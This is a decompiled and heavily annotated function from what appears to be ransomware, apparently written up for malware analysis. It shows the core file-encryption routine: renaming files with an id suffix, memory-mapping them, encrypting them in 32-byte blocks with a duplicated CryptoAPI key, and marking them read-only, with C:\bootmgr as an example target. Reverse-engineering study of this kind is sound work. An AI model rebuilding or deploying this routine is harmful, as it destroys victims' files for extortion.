
/*
ex : 
    filename         == "\\\\?\\C:\\bootmgr"
    filename[0x4010] == "\\\\?\\C:\\bootmgr id-UXOiNNkbdy.BI_D"
*/
undefined8 __fastcall FUN_00401292(undefined4 param_1,undefined4 param_2,LPCWSTR fileName)

{
  LPVOID plaintext;
  undefined4 in_EAX;
  HANDLE hFile;
  HCRYPTKEY dupicatedKey;
  HCRYPTPROV handle_CSP2;
  DWORD local_1c;
  uint local_18;
  LPVOID startAddMapView;
  HANDLE local_10;
  uint local_c;
  HANDLE hFile1;
  
  LPCWSTR lpNewFileName = fileName[0x4010];

  /* Moves an existing file or a directory, including its children.
      [in] LPCWSTR lpExistingFileName : The current name of the file or directory on the local computer.
      [in] LPCWSTR lpNewFileName : The new name for the file or directory. 

      Return value : If the function succeeds, the return value is nonzero.
                     If the function fails, the return value is zero. 
  */
  BOOL ret_val = MoveFileW(fileName,lpNewFileName);

  // If file moves correctly
  if (ret_val != 0) {

    /* Creates or opens a file or I/O device.  
        [in] LPCWSTR lpFileName : The name of the file or device to be created or opened. 
        [in] DWORD dwDesiredAccess (0xc0000000 = generic read and generic write) : The requested access to the file or device, which can be summarized as read, write, both or neither zero).
        [in] DWORD dwShareMode : The requested sharing mode of the file or device.
                                 If this parameter is zero and CreateFile succeeds, the file or device cannot be shared and cannot be opened again until the handle to the file or device is closed.
        [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes : A pointer to a SECURITY_ATTRIBUTES structure that contains two separate but related data members: an optional security descriptor, and a Boolean value that determines whether the returned handle can be inherited by child processes.
        [in] DWORD dwCreationDisposition (3 = OPEN_EXISTING = Opens a file or device, only if it exists) : An action to take on a file or device that exists or does not exist.
        [in] DWORD dwFlagsAndAttributes : The file or device attributes and flags, FILE_ATTRIBUTE_NORMAL being the most common default value for files.
        [in, optional] HANDLE hTemplateFile : A valid handle to a template file with the GENERIC_READ access right.

        Return value : If the function succeeds, the return value is an open handle to the specified file, device, named pipe, or mail slot.
    */
    hFile = CreateFileW(lpNewFileName,0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);


    /* Creates or opens a named or unnamed file mapping object for a specified file.
        [in] HANDLE hFile : A handle to the file from which to create a file mapping object.
        [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes : A pointer to a SECURITY_ATTRIBUTES structure that determines whether a returned handle can be inherited by child processes.
        [in] DWORD flProtect (4 = PAGE_READWRITE = Allows views to be mapped for read-only, copy-on-write, or read/write access): Specifies the page protection of the file mapping object. 
        [in] DWORD dwMaximumSizeHigh : The high-order DWORD of the maximum size of the file mapping object.
        [in] DWORD dwMaximumSizeLow : The low-order DWORD of the maximum size of the file mapping object.
        [in, optional] LPCSTR lpName : The name of the file mapping object.

        Return value : 
    */
    // If correct handle and 
    if ((hFile != (HANDLE)0xffffffff) && 
      (hFile1 = hFile, hFile = CreateFileMappingA(hFile,(LPSECURITY_ATTRIBUTES)0x0,4,0,0,(LPCSTR)0x0), hFile != (HANDLE)0x0)) {
      
      local_c = fileName[0x8020];
      // local_c == 0x2000

      if (local_c < 0x100000) {
        local_18 = local_c >> 5;
        // local_18 == 0x100
      }
      else {
        local_c = 0x100000;
        local_18 = 0x51ea;
      }

      local_10 = hFile;

      /* Maps a view of a file mapping into the address space of a calling process.
          [in] HANDLE hFileMappingObject : A handle to a file mapping object.
          [in] DWORD dwDesiredAccess : The type of access to a file mapping object, which determines the page protection of the pages. 
          [in] DWORD dwFileOffsetHigh : A high-order DWORD of the file offset where the view begins.
          [in] DWORD dwFileOffsetLow : A low-order DWORD of the file offset where the view is to begin.
          [in] SIZE_T dwNumberOfBytesToMap : The number of bytes of a file mapping to map to the view.

          Return value : If the function succeeds, the return value is the starting address of the mapped view.
                         If the function fails, the return value is NULL.
      */
      startAddMapView = MapViewOfFile(hFile,2,0,0,local_c);

      if (startAddMapView != (LPVOID)0x0) {

        /* The CryptDuplicateKey function makes an exact copy of a key and the state of the key.
              [in]  HCRYPTKEY hKey : A handle to the key to be duplicated. (CSP of private key) ====> DAT_404B20
              [in]  DWORD *pdwReserved : Reserved for future use and must be NULL.
              [in]  DWORD dwFlags : Reserved for future use and must be zero.
              [out] HCRYPTKEY *phKey : Address of the handle to the duplicated key.

            Return value : If the function succeeds, the return value is nonzero (TRUE).
        */
        CryptDuplicateKey(handle_CSP2,(DWORD *)0x0,0,&dupicatedKey);

        plaintext = startAddMapView;
        int i = 0;
        local_1c = 0x20;

        // Encrypt file 32 bytes by 32 bytes
        do {
          /* The CryptEncrypt function encrypts data. The algorithm used to encrypt the data is designated by the key held by the CSP module and is referenced by the hKey parameter.
              [in] HCRYPTKEY hKey : A handle to the encryption key.
              [in] HCRYPTHASH hHash : A handle to a hash object.
              [in] BOOL Final : A Boolean value that specifies whether this is the last section in a series being encrypted.
              [in] DWORD dwFlags : The following dwFlags value is defined but reserved for future use.
              [in, out] BYTE *pbData : A pointer to a buffer that contains the plaintext to be encrypted.
              [in, out] DWORD *pdwDataLen : A pointer to a DWORD value that , on entry, contains the length, in bytes, of the plaintext in the pbData buffer.
              [in] DWORD dwBufLen : Specifies the total size, in bytes, of the input pbData buffer.
          */
          CryptEncrypt(dupicatedKey,0,0,0,(BYTE *)plaintext[i * 0x20],&local_1c,0x20);
          
          i++;
          local_18--;
        } while (local_18 != 0);

        /* Unmaps a mapped view of a file from the calling process's address space.
            [in] LPCVOID lpBaseAddress : A pointer to the base address of the mapped view of a file that is to be unmapped.

            Return value : If the function succeeds, the return value is nonzero.
        */
        UnmapViewOfFile(startAddMapView);

        /* Closes an open object handle.
            [in] HANDLE hObject : A valid handle to an open object.

            Return value : If the function succeeds, the return value is nonzero.
        */
        CloseHandle(local_10);
        CloseHandle(hFile1);

        // Update counter of encrypted value
        DAT_00404b48++;

        /* The CryptDestroyKey function releases the handle referenced by the hKey parameter.
              hKey : The handle of the key to be destroyed.
        */
        CryptDestroyKey(dupicatedKey);

        /* Sets the attributes for a file or directory. 
          [in] LPCWSTR lpFileName : The name of the file whose attributes are to be set.
          [in] DWORD dwFileAttributes (0x1 == FILE_ATTRIBUTE_READONLY == A file that is read-only.) : The file attributes to set for the file.
        */
        SetFileAttributesW(fileName + 0x4010,1);

        goto LAB_004013de;
      }

      /* Closes an open object handle.
            [in] HANDLE hObject : A valid handle to an open object.

            Return value : If the function succeeds, the return value is nonzero.
      */
      CloseHandle(local_10);
      CloseHandle(hFile1);
    }

    /* Moves an existing file or a directory, including its children.
      [in] LPCWSTR lpExistingFileName : The current name of the file or directory on the local computer.
      [in] LPCWSTR lpNewFileName : The new name for the file or directory. 

      Return value : If the function succeeds, the return value is nonzero.
                     If the function fails, the return value is zero. 
    */
    MoveFileW(fileName + 0x4010,fileName);
  }
LAB_004013de:
  return CONCAT44(param_2,in_EAX);
}
